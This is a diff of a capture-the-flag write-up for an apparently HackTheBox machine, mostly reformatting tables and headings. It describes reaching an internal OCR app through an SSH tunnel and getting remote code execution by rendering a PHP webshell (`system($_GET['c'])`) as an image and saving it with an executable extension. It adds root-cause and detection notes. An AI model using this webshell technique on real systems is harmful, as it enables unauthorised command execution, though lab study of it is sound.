@@ -9,7 +9,7 @@ Services: SSH, internal OCR web application (127.0.0.1:8001, HTTP Basic Auth)
 ## Summary of Attack Chain
 
 | Step | User / Access | Technique Used | Result |
-| :-: | :- | : | :- |
+| :---: | :-------- | :---------------------------------------- | :---------------------------------------------------------------------------------- |
 | 1 | walter (SSH creds) | **SSH local port-forward** | Exposed the internal-only OCR web app (`127.0.0.1:8001`) locally via `ssh -L`. |
 | 2 | walter | **PHP payload rendered as image** | Drew `<?php system($_GET['c']); ?>` onto a PNG canvas for OCR ingestion. |
 | 3 | walter | **OCR submission** | Submitted the image to the OCR endpoint, obtaining an `ocr_id` for the recognized text. |
@@ -19,7 +19,7 @@ Services: SSH, internal OCR web application (127.0.0.1:8001, HTTP Basic Auth)
 
 
 
-## 1. Summary
+## Summary
 
 `walter`'s SSH credentials provide access to the box, but the interesting attack surface - an internal OCR (optical character recognition) web application - is bound to `127.0.0.1:8001` and not reachable directly from outside. An SSH local port‑forward exposes that internal service locally.
 
@@ -27,7 +27,7 @@ The OCR app accepts an uploaded image, performs OCR against it, and offers a "sa
 
 
 
-## 2. Enumeration
+## Enumeration
 
 - **SSH (22/tcp)** - valid credentials known for user `walter`.
 - **Internal service, `127.0.0.1:8001`** - an OCR web application, bound to loopback only, so it is not exposed externally; requires SSH access to the box to reach it (local port‑forward).
@@ -38,7 +38,7 @@ The OCR app accepts an uploaded image, performs OCR against it, and offers a "sa
 
 
 
-## 3. Access Setup - SSH Local Port‑Forward
+## Access Setup - SSH Local Port‑Forward
 
 Since the OCR app is bound to `127.0.0.1:8001` on the target itself, it's only reachable through an SSH tunnel:
 ```
@@ -48,9 +48,9 @@ This makes the internal app available at `http://127.0.0.1:8001/` on the attacke
 
 
 
-## 4. Exploitation - OCR‑to‑Webshell RCE
+## Exploitation - OCR‑to‑Webshell RCE
 
-### 4.1 Vulnerability
+### Vulnerability
 
 The OCR "save output" feature writes attacker‑influenced *content* (the OCR‑recognized text of an uploaded image) to an attacker‑chosen *filename* inside a directory served directly by the web server. Two separate weaknesses combine here:
 
@@ -59,7 +59,7 @@ The OCR "save output" feature writes attacker‑influenced *content* (the OCR‑
 
 Together, this is a classic **unrestricted file upload -> RCE** pattern, just routed through an OCR pipeline instead of a raw file‑upload form.
 
-### 4.2 Exploit steps
+### Exploit steps
 1. **Render the payload as an image.** Draw the text `<?php system($_GET['c']); ?>` onto a blank PNG canvas using a monospace font, so OCR can reliably read it back as text.
 2. **Submit the image** to the OCR endpoint (`canvas_image` field, base64 data URI) and parse the returned `ocr_id` from the response HTML.
 3. **Trigger "save output"** with that `ocr_id` and a candidate filename, iterating over PHP‑executable extensions (`.php`, `.phtml`, `.php5`, `.pht`) until one is accepted and not blocked by any server‑side filter.
@@ -67,11 +67,12 @@ Together, this is a classic **unrestricted file upload -> RCE** pattern, just ro
 5. **Use the shell** - issue arbitrary commands via `?c=<cmd>`, either one‑shot or in an interactive read‑eval loop.
 
 
+/home/z0n/z0n/z0n/posts/MakeSense/htb_makesense_user_root_flag_.png
 
-## 5. Root Cause Analysis
+## Root Cause Analysis
 
 | Stage | Root Cause | CWE |
-||||
+|--------|----------------------------------|---------------------------------------------------------------|
 | Internal app reachable only via SSH tunnel | Expected network segmentation (not itself a bug) - but relies on `walter`'s credentials being the only gate | N/A |
 | OCR‑to‑webshell RCE | Uploaded/recognized content written to an attacker‑chosen filename with an executable extension inside a web‑servable directory, with no content‑type or extension allow‑listing | CWE‑434 (Unrestricted Upload of File with Dangerous Type) |
 | No output sanitization | OCR text output trusted and written to disk verbatim, with no encoding/escaping for the destination context (a PHP‑interpreted file) | CWE‑95 (Improper Neutralization of Directives in Dynamically Evaluated Code) |
@@ -100,7 +101,7 @@ Once a working extension is confirmed, arbitrary commands are executed via `save
 ## Attack Vector
 
 | Attribute | Technical Details |
-| :-- | :- |
+| :------------------------------ | :---------------------------------------------------------------------------------------- |
 | **Primary Identifiers** | Internal OCR app, loopback-only `127.0.0.1:8001`<br>`canvas_image` submission endpoint<br>"Save output" action (`ocr_id`, `filename`, `save_output=1`)<br>Web-servable `saved/` directory |
 | **Critical Vulnerability** | **Unrestricted file upload with dangerous type** - OCR-recognized content written to a client-chosen filename/extension inside a web-executable directory, with no content or extension filtering. |
 | **Offensive Action** | SSH tunnel to internal app -> PHP-as-image OCR submission -> save-output extension abuse -> direct webshell invocation |
@@ -161,7 +162,7 @@ DeviceProcessEvents
 ## Quick Action Playbook
 
 | Step | Objective | Technical Command / Logic |
-| :--: | :-- | : |
+| :----: | :------------------------------ | :-------------------------------------------------------------------------------------------- |
 | **01** | **Reach the internal app** | `ssh -L 8001:127.0.0.1:8001 walter@<target>` |
 | **02** | **Render & submit payload** | POST base64 PNG of `<?php system($_GET['c']); ?>` to OCR `canvas_image` endpoint |
 | **03** | **Escalate to RCE** | POST `save_output=1` with filename `shell.php`/`.phtml`/`.php5`/`.pht`, then `GET saved/<filename>?c=id` |
